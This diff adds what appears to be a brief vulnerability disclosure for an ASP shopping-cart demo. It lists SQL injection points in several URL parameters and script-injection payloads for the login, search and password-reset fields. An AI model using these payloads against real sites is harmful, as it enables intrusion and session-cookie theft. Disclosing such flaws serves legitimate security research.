@@ -1,0 +1,17 @@
+http://www.example.com/infinicart-demo/browse_group.asp?groupid=[sql]
+http://www.example.com/infinicart-demo/added_to_cart.asp?productid=[sql]
+http://www.example.com/infinicart-demo/browsesubcat.asp?catid=[sql]
+http://www.example.com/infinicart-demo/browsesubcat.asp?catid=13&amp;subid=[sql]
+
+in /infinicart-demo/login.asp :
+
+username ( go for 2 xss like :
+&lt;/textarea&gt;&#039;&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;;&lt;/textarea&gt;&#039;&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt; )
+passwd ( same as username )
+
+in /infinicart-demo/search.asp :
+post the following search = &lt;/textarea&gt;&#039;&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+in /infinicart-demo/sendpassword.asp :
+email= &lt;/textarea&gt;&#039;&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
